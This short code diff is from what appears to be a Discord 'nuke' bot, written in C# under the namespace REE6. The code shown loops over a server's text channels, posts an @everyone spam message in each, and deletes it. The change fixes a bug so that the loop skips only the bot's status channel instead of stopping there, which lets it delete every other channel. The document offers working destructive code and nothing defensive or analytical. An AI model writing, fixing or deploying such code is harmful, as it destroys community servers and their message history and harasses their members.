@@ -26,8 +26,8 @@ namespace REE6
             await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Purging text channels...");
             foreach (ITextChannel channel in await guild.GetTextChannelsAsync())
             {
-                if (channel == statusChannel)
-                    break;
+                if (channel.Id == statusChannel.Id)
+                    continue;
                 await channel.SendMessageAsync("@everyone REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE!!!!");
                 await channel.DeleteAsync();
             }
